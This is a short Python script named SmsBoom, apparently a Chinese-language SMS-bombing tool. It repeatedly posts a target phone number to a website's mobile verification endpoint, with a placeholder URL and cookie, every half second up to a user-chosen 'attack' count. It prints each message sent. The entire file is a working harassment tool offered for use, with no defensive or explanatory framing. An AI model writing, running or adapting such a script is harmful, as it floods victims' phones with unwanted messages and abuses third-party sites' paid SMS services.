# -- coding: utf-8 --
#Wittten by hacden 2020/05/09
import requests
import time
headers = {'Content-Length': "35",
            'Accept': "text/plain, */*; q=0.01",
            'X-Requested-With': "XMLHttpRequest",
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'Origin': "http://xxx.xxx.xxx",
            'Referer': "http://xxx.xxx.xxx",
            'Accept-Encoding': "gzip, deflate",
            'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
            'Cookie': "xxxxxxxxxxxxxxxxxxxxxxxx",
            'Connection': "close"
           }
def SmsBoom(phpnumber,url):
    data = {'do':"mobile_verify",
            'mobile': phpnumber
            }
    requests.post(url, headers=headers, data=data)
if __name__ == '__main__':
    n = 0
    url = "http://xxx.xxx.xxx"
    phpnumber = input("请输入你的手机号码:")
    AckNumber = int(input("请你输入攻击的次数:"))
    while True:
        SmsBoom(phpnumber, url)
        time.sleep(0.5)
        n += 1
        print("[+]成功发送{}条".format(n))
        if n == AckNumber:
            print('结束攻击')
            break
